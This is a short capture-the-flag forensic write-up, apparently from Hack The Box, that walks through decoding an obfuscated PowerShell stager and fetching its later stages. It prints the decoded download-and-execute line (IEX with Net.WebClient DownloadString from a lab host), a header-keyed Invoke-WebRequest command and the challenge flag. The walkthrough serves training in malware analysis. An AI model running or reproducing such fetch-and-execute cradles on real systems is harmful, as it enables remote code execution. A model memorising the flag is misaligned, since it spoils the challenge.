# 🔍 Forensic – Thorin's Amulet

## Challenge Overview

This forensic investigation involves analyzing an obfuscated PowerShell script, decoding a payload, and tracing staged download commands to uncover a hidden flag.

---

### 🛠 Preparation

To avoid modifying your `/etc/hosts` file, replace the hostname `korp.htb` with the Docker IP:
```
94.237.61.100:37543
```

---

### 🔹 Step 1: Download and Open the `.ps1` Script

Examine the contents of the PowerShell script. You'll find a Base64-encoded string embedded within:

```powershell
"SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
```

---

### 🔹 Step 2: Decode the Base64 String

Use your favorite tool to decode it. It translates to:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Replace `korp.htb` with `94.237.61.100:37543` to access it directly.

---

### 🔹 Step 3: Visit the Update URL

Navigate to:

👉 `http://94.237.61.100:37543/update`

This will download a second PowerShell file: `update.ps1`.

---

### 🔹 Step 4: Download the Next Stage Payload

Execute the following PowerShell command to retrieve the final script:

```powershell
Invoke-WebRequest -Uri "http://94.237.61.100:37543/a541a" `
  -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} `
  -Method GET -OutFile a541a.ps1
```

This fetches `a541a.ps1`, which contains the logic to generate the final flag.

---

### 🏁 Flag

```
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```

## Write-Up Credit: [kkc123](https://ctf.hackthebox.com/user/profile/606424)